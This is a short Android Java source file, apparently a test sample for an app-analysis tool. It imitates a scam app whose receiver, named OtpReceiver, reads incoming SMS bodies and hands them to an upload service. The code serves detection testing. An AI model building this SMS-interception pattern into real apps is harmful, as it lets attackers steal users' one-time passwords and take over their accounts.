package sim.packpeek.undangan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

/**
 * TEST SAMPLE ONLY, never runs (hasCode="false"). Imitates scam apps that hand the SMS text to a
 * Service through an Intent, so reading and sending are in different components.
 */
public class OtpReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        Intent upload = new Intent(context, UploadService.class);
        upload.putExtra("body", messages[0].getMessageBody());
        context.startService(upload);
    }
}
